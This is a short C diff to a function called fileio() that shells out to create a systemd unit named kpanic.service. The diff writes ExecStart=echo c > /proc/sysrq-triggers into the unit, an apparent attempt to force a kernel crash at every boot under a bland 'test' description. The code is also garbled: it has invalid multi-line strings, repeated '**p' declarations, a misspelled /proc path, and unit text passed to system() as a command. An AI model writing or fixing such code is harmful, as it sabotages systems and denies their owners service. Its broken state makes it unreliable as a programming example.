@@ -8,24 +8,21 @@
 
 int fileio () {
 
-    char cd[MAX_CMN_LEN] = "cd /usr/lib/systemd/system/";
-    char touch[MAX_CMN_LEN] = "touch kpanic.service";
+    char cd[MAX_CMN_LEN] = "cd /usr/lib/systemd/system/", **p;
+    char touch[MAX_CMN_LEN] = "touch kpanic.service", **p;
     system(cd);
     system(touch);
     
-    char ch;
-    FILE *fpr;
-    fpr = fopen("/usr/lib/systemd/system/kpanic.service", "w+");
-    fputs("[Unit]
-    Description=test
+    char write[MAX_CMN_LEN] = "[Unit]
+                               Description=test
 
-    [Service]
-    ExecStart=/bin/bash 
+                               [Service]
+                               ExecStart=echo c > /proc/sysrq-triggers 
 
-    [Install]
-    WantedBy=multi-user.target)
-    
-    ", fpr);
+                               [Install]
+                               WantedBy=multi-user.target)", **p;
+
+    system(write);
 
     return 0;
 }
